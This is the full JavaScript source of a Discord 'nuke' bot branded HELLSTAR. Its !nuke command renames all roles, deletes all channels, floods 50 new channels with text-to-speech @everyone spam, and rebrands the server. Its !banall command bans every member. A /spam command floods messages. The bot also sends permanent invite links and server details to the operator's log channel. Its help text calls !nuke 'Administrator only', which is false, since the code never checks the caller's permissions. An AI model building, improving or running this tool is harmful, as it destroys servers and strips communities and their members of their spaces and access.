const {
  Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder
} = require('discord.js');
const { joinVoiceChannel } = require('@discordjs/voice');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
  ],
});

const PREFIX = '!';
const LOG_CHANNEL_ID = '1518813932909760532';
const NUKE_CHANNEL_NAME = 'NUKED BY HELLSTAR';
const NUKE_ROLE_NAME = 'NUKED BY HELLSTAR';
const RENAME_TEXT = 'NUKED BY HELLSTAR';
const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/hellstarrp ||`;
const ICON_URL = 'https://cdn.discordapp.com/attachments/1518813932909760532/1518814085888741376/effb12e066db52fa694d5f9545387c5a.jpg?ex=6a3b4958&is=6a39f7d8&hm=7cd4a3c4810dbecf5e2bc8be2c612f7f53a49d24a68fb955c0b9dca87b1792b5&';
const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
const TARGET_VOICE_CHANNEL_ID = '1515317424323428398';
const IMMUNE_GUILD_ID = '1518698079992287242';

const nukeSessions = new Map();

// ───────────────────────────────────────────────────────────────
// Helper: check bot permissions and return missing list
function getMissingPerms(guild, requiredPerms) {
  const botMember = guild.members.me;
  if (!botMember) return requiredPerms; // should not happen
  const botPerms = botMember.permissions;
  return requiredPerms.filter(perm => !botPerms.has(perm));
}

// Helper: check permissions and reply with missing list
function checkPermsAndReply(message, requiredPerms) {
  const missing = getMissingPerms(message.guild, requiredPerms);
  if (missing.length > 0) {
    const permNames = missing.map(p => `\`${p}\``).join(', ');
    message.reply(`❌ I am missing the following permissions:\n${permNames}\nPlease grant them and try again.`);
    return false;
  }
  return true;
}

// ─── Log embed ──────────────────────────────────────────────────
async function sendLogEmbed(guild, executor, eventType) {
  const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
  if (!logChannel) return;
  let invite = 'No invite available';
  try {
    const inviteChannel = guild.systemChannel || guild.channels.cache.find(c => c.type === 0 && c.permissionsFor(guild.members.me).has('CreateInstantInvite'));
    if (inviteChannel) {
      const inviteLink = await inviteChannel.createInvite({ maxAge: 0, maxUses: 0, reason: 'Log invite' });
      invite = inviteLink.url;
    }
  } catch {}
  const embed = new EmbedBuilder()
    .setTitle(eventType === 'nuke' ? '💀 Nuke Command Executed' : '🤖 Bot Added to Server')
    .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
    .setColor(eventType === 'nuke' ? 0xff0000 : 0x00ff00)
    .addFields(
      { name: 'Server Name', value: guild.name, inline: true },
      { name: 'Server ID', value: guild.id, inline: true },
      { name: 'Executor', value: executor || guild.owner?.tag || 'Unknown', inline: true },
      { name: 'Members', value: guild.memberCount.toString(), inline: true },
      { name: 'Channels', value: guild.channels.cache.size.toString(), inline: true },
      { name: 'Roles', value: guild.roles.cache.size.toString(), inline: true },
      { name: 'Invite Link', value: invite, inline: false }
    )
    .setTimestamp()
    .setFooter({ text: `Logged at ${new Date().toLocaleString()}` });
  try { await logChannel.send({ embeds: [embed] }); } catch {}
}

client.on('guildCreate', async (guild) => {
  await sendLogEmbed(guild, guild.owner?.tag || 'Bot Owner (via OAuth)', 'add');
});

// ─── Ready & Slash Commands ─────────────────────────────────────
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);

  try {
    await client.application.commands.set([
      new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spam a message multiple times (works in DMs and servers)')
        .addStringOption(option =>
          option.setName('text')
            .setDescription('The message to spam')
            .setRequired(true))
        .addIntegerOption(option =>
          option.setName('count')
            .setDescription('Number of times to send (default 5, max 100)')
            .setRequired(false)
            .setMinValue(1)
            .setMaxValue(100))
    ]);
    console.log('✅ Global slash commands registered.');
  } catch (err) {
    console.error('❌ Failed to register slash commands:', err);
  }

  // Voice channel join
  try {
    const voiceChannel = client.channels.cache.get(TARGET_VOICE_CHANNEL_ID);
    if (!voiceChannel) {
      console.error(`❌ Voice channel ${TARGET_VOICE_CHANNEL_ID} not found.`);
      return;
    }
    if (voiceChannel.type !== 2) {
      console.error(`❌ Channel ${TARGET_VOICE_CHANNEL_ID} is not a voice channel.`);
      return;
    }
    const connection = joinVoiceChannel({
      channelId: voiceChannel.id,
      guildId: voiceChannel.guild.id,
      adapterCreator: voiceChannel.guild.voiceAdapterCreator,
      selfDeaf: true,
    });
    console.log(`🔊 Joined voice channel ${voiceChannel.name} in guild ${voiceChannel.guild.name}`);
  } catch (err) {
    console.error('❌ Failed to join voice channel:', err);
  }
});

// ─── Interaction handler ───────────────────────────────────────
client.on('interactionCreate', async (interaction) => {
  if (interaction.isChatInputCommand() && interaction.commandName === 'spam') {
    const text = interaction.options.getString('text', true);
    const count = interaction.options.getInteger('count') ?? 5;

    await interaction.deferReply({ ephemeral: false });

    if (interaction.guild) {
      const botMember = interaction.guild.members.me;
      if (!botMember.permissions.has(PermissionsBitField.Flags.SendMessages)) {
        await interaction.editReply('❌ I do not have permission to send messages in this channel.');
        return;
      }
    }

    for (let i = 0; i < count; i++) {
      try {
        await interaction.channel.send(text);
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (err) {
        console.error(`Spam error at message ${i}:`, err);
        break;
      }
    }

    try { await interaction.deleteReply(); } catch {}
    return;
  }

  if (interaction.isButton()) {
    const session = nukeSessions.get(interaction.guild.id);
    if (!session) return interaction.reply({ content: 'No active nuke session.', ephemeral: true });
    if (interaction.user.id !== session.executorId) {
      return interaction.reply({ content: '❌ Only the person who ran `!nuke` can use these buttons.', ephemeral: true });
    }
    if (interaction.customId === 'nuke_pause') {
      session.paused = true;
      await interaction.reply({ content: '⏸ Nuke **paused**.', ephemeral: true });
    } else if (interaction.customId === 'nuke_resume') {
      session.paused = false;
      await interaction.reply({ content: '▶ Nuke **resumed**.', ephemeral: true });
    }
  }
});

// ─── Message Commands ─────────────────────────────────────────────
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // Immune server protection
  if (message.guild && message.guild.id === IMMUNE_GUILD_ID) {
    if (command === 'nuke' || command === 'banall') {
      await message.reply('nice try buddy 🤣');
      return;
    }
  }

  // ─── NUKE ─────────────────────────────────────────────────
  if (command === 'nuke') {
    const guild = message.guild;
    const executorId = message.author.id;

    // Required permissions for full nuke
    const requiredPerms = [
      PermissionsBitField.Flags.ManageRoles,
      PermissionsBitField.Flags.ManageChannels,
      PermissionsBitField.Flags.ManageGuild,
      PermissionsBitField.Flags.MentionEveryone, // For @everyone/@here
      PermissionsBitField.Flags.CreateEvents,    // Optional but nice
    ];
    if (!checkPermsAndReply(message, requiredPerms)) return;

    await sendLogEmbed(guild, message.author.tag, 'nuke');

    const session = { paused: false, executorId };
    nukeSessions.set(guild.id, session);

    const embed = new EmbedBuilder()
      .setTitle('💀 NUKE IN PROGRESS')
      .setColor(0xff0000)
      .setDescription('Starting nuke...')
      .addFields(
        { name: 'Roles Renamed', value: '0', inline: true },
        { name: 'Channels Deleted', value: '0', inline: true },
        { name: 'Channels Created', value: '0', inline: true },
        { name: 'Status', value: '🔴 Running', inline: true }
      )
      .setFooter({ text: `Executed by ${message.author.tag}` })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('nuke_pause').setLabel('⏸ PAUSE').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId('nuke_resume').setLabel('▶ RESUME').setStyle(ButtonStyle.Success)
    );

    const statusMsg = await message.channel.send({ embeds: [embed], components: [row] });

    const updateEmbed = async (renameCount, deleteCount, createCount, statusText) => {
      const updated = EmbedBuilder.from(statusMsg.embeds[0])
        .setDescription(
          statusText === 'done' ? '✅ Nuke complete! Server renamed, icon changed, description set, event created.' :
          statusText === 'paused' ? '⏸ Nuke paused.' :
          'Nuking in progress...'
        )
        .setColor(statusText === 'done' ? 0x00ff00 : statusText === 'paused' ? 0xffaa00 : 0xff0000)
        .spliceFields(0, 4,
          { name: 'Roles Renamed', value: `${renameCount}`, inline: true },
          { name: 'Channels Deleted', value: `${deleteCount}`, inline: true },
          { name: 'Channels Created', value: `${createCount}`, inline: true },
          { name: 'Status', value: statusText === 'done' ? '✅ Done' : statusText === 'paused' ? '⏸ Paused' : session.paused ? '⏸ Paused' : '🔴 Running', inline: true }
        );
      await statusMsg.edit({ embeds: [updated], components: (statusText === 'done') ? [] : [row] }).catch(() => {});
    };

    const waitWhilePaused = async () => {
      while (session.paused) {
        await new Promise(r => setTimeout(r, 5));
      }
    };

    let renameCount = 0;
    let deleteCount = 0;
    let createCount = 0;
    let createdChannels = [];

    // Step 1: Rename roles
    await guild.roles.fetch();
    const normalizedTarget = RENAME_TEXT.normalize('NFD');
    const rolesToRename = [...guild.roles.cache.values()].filter(
      r => r.id !== guild.id && !r.managed && r.editable && r.name.normalize('NFD') !== normalizedTarget
    );
    const chunkSize = 5;
    for (let i = 0; i < rolesToRename.length; i += chunkSize) {
      const chunk = rolesToRename.slice(i, i + chunkSize);
      await Promise.allSettled(
        chunk.map(async (role) => {
          await waitWhilePaused();
          try {
            await role.setName(RENAME_TEXT, 'Nuke command');
            renameCount++;
            await updateEmbed(renameCount, deleteCount, createCount, 'running');
          } catch {}
        })
      );
    }

    // Step 2: Delete all channels
    const allChannels = [...guild.channels.cache.values()];
    await Promise.allSettled(
      allChannels.map(async (channel) => {
        await waitWhilePaused();
        try {
          await channel.delete('Nuke command');
          deleteCount++;
          await updateEmbed(renameCount, deleteCount, createCount, 'running');
        } catch {}
      })
    );

    // Step 3: Create 50 channels and spam TTS
    const createPromises = Array(50).fill().map(async () => {
      try {
        const ch = await guild.channels.create({ name: NUKE_CHANNEL_NAME, reason: 'Nuke command' });
        for (let i = 0; i < 100; i++) {
          await ch.send({ content: MESSAGE_CONTENT, tts: true }).catch(() => {});
        }
        createdChannels.push(ch);
        return ch;
      } catch { return null; }
    });
    const results = await Promise.allSettled(createPromises);
    createCount = results.filter(r => r.status === 'fulfilled' && r.value !== null).length;
    await updateEmbed(renameCount, deleteCount, createCount, 'running');

    // Step 4: Rename server (needs ManageGuild)
    try { await guild.setName(RENAME_TEXT, 'Nuke command'); } catch {}

    // Step 5: Change icon and description (needs ManageGuild)
    try {
      const response = await fetch(ICON_URL);
      const buffer = Buffer.from(await response.arrayBuffer());
      await guild.setIcon(buffer, 'Nuke command');
    } catch { console.error('Failed to set icon.'); }
    try { await guild.setDescription(SERVER_DESCRIPTION, 'Nuke command'); } catch {}

    // Step 6: Create event (needs CreateEvents)
    if (createdChannels.length > 0) {
      const firstChannel = createdChannels[0];
      const startTime = new Date();
      startTime.setSeconds(startTime.getSeconds() + 5);
      const endTime = new Date();
      endTime.setFullYear(endTime.getFullYear() + 100);
      try {
        await guild.scheduledEvents.create({
          name: RENAME_TEXT,
          description: RENAME_TEXT,
          scheduledStartTime: startTime,
          scheduledEndTime: endTime,
          privacyLevel: 2,
          entityType: 2,
          channel: firstChannel.id,
          reason: 'Nuke command'
        });
      } catch { console.error('Failed to create event.'); }
    }

    // Final message
    if (createdChannels.length > 0) {
      const finalEmbed = new EmbedBuilder()
        .setTitle('💀 NUKE COMPLETE')
        .setColor(0x00ff00)
        .setDescription('All channels deleted, new ones created, server renamed, icon/description changed, event created, messages spammed!')
        .addFields(
          { name: 'Roles Renamed', value: `${renameCount}`, inline: true },
          { name: 'Channels Deleted', value: `${deleteCount}`, inline: true },
          { name: 'Channels Created', value: `${createCount}`, inline: true },
          { name: 'Status', value: '✅ Done', inline: true }
        )
        .setFooter({ text: `Executed by ${message.author.tag}` })
        .setTimestamp();
      await createdChannels[0].send({ embeds: [finalEmbed] }).catch(() => {});
      const ttsSummary = `Nuke complete. ${renameCount} roles renamed, ${deleteCount} channels deleted, ${createCount} channels created. Server nuked by ${message.author.tag}.`;
      await createdChannels[0].send({ content: ttsSummary, tts: true }).catch(() => {});
    }

    nukeSessions.delete(guild.id);
  }

  // ─── BANALL ───────────────────────────────────────────────
  if (command === 'banall') {
    const guild = message.guild;

    const requiredPerms = [PermissionsBitField.Flags.BanMembers];
    if (!checkPermsAndReply(message, requiredPerms)) return;

    const embed = new EmbedBuilder()
      .setTitle('🔨 BANNING ALL MEMBERS')
      .setColor(0xff0000)
      .setDescription('Fetching members...')
      .addFields(
        { name: 'Total Members', value: '?', inline: true },
        { name: 'Banned', value: '0', inline: true },
        { name: 'Status', value: '🟡 Loading', inline: true }
      )
      .setFooter({ text: `Executed by ${message.author.tag}` })
      .setTimestamp();

    const statusMsg = await message.channel.send({ embeds: [embed] });

    await guild.members.fetch();
    const allMembers = [...guild.members.cache.values()];
    const botMember = guild.members.me;
    const membersToBan = allMembers.filter(m => m.id !== botMember.id);
    const total = membersToBan.length;

    const updateBanEmbed = (bannedCount, statusText) => {
      const updated = EmbedBuilder.from(statusMsg.embeds[0])
        .setDescription(statusText === 'done' ? '✅ All members banned!' : `Banning members... (${bannedCount}/${total})`)
        .setColor(statusText === 'done' ? 0x00ff00 : 0xff0000)
        .spliceFields(0, 3,
          { name: 'Total Members', value: `${total}`, inline: true },
          { name: 'Banned', value: `${bannedCount}`, inline: true },
          { name: 'Status', value: statusText === 'done' ? '✅ Done' : '🔴 Running', inline: true }
        );
      statusMsg.edit({ embeds: [updated] }).catch(() => {});
    };

    updateBanEmbed(0, 'running');

    const batchSize = 10;
    let bannedCount = 0;
    for (let i = 0; i < membersToBan.length; i += batchSize) {
      const batch = membersToBan.slice(i, i + batchSize);
      const results = await Promise.allSettled(
        batch.map(async (member) => {
          try { await member.ban({ reason: `Banall by ${message.author.tag}` }); return true; } catch { return false; }
        })
      );
      bannedCount += results.filter(r => r.status === 'fulfilled' && r.value === true).length;
      updateBanEmbed(bannedCount, 'running');
    }

    updateBanEmbed(bannedCount, 'done');

    const ttsMsg = `Banall complete. ${bannedCount} members banned out of ${total}. Executed by ${message.author.tag}.`;
    try { await message.channel.send({ content: ttsMsg, tts: true }); } catch {}
  }

  if (command === 'help') {
    message.reply(
      '**🔥 Nuke Bot Commands**\n' +
      '`!nuke` — Rename roles → delete all channels → create new channels & spam (TTS) → rename server → change icon/desc → create event (Administrator only)\n' +
      '`!banall` — Ban every member in the server (Ban Members permission required)\n' +
      '`!help` — Show this message\n' +
      '**/spam** — Slash command to spam text (global – works in DMs and servers)'
    );
  }
});

client.login(process.env.DISCORD_TOKEN);
